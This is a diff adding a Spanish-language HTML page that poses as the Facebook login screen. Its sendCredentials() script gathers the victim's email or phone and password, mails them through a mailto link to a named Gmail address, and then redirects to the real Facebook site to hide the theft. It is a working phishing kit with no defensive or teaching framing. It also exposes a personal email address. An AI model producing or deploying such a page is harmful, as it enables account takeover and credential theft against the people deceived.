@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <style>
+        /* Estilos CSS aquí */
+        body {
+            background: #fff;
+            color: #1c1e21;
+            direction: ltr;
+            line-height: 1.34;
+            margin: 0;
+            padding: 0;
+            unicode-bidi: embed;
+        }
+        .login-container {
+            width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            background: #f0f2f5;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            text-align: left;
+        }
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .logo-container img {
+            width: 70px;
+            height: 70px;
+            margin-right: 20px;
+        }
+        .tagline {
+            font-size: 14px;
+            color: #555;
+            margin-top: 10px;
+            text-align: left;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+        .btn-login {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo-container">
+            <img src="https://terabox.com/s/1rcHcmKmnKYMFHPZvkODx4w" alt="Facebook">
+            <div>
+                <h2>Iniciar sesión en Facebook</h2>
+                <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+            </div>
+        </div>
+        <div class="input-group">
+            <label for="user">Correo electrónico o teléfono</label>
+            <input type="text" id="user" name="user" placeholder="Correo electrónico o teléfono" required>
+        </div>
+        <div class="input-group">
+            <label for="password">Contraseña</label>
+            <input type="password" id="password" name="password" placeholder="Contraseña" required>
+        </div>
+        <button class="btn-login" onclick="sendCredentials()">Iniciar sesión</button>
+    </div>
+
+    <script>
+        function sendCredentials() {
+            var user = document.getElementById('user').value;
+            var password = document.getElementById('password').value;
+            var mensaje = "Usuario (correo o teléfono): " + user + "\nContraseña: " + password;
+            var correoDestino = "kelmerjoseg@gmail.com";
+            var subject = "Datos de inicio de sesión - Facebook";
+            var mailToLink = "mailto:" + correoDestino + "?subject=" + subject + "&body=" + encodeURIComponent(mensaje);
+            window.location.href = mailToLink;
+            setTimeout(function() {
+                window.location.href = "https://web.facebook.com/";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
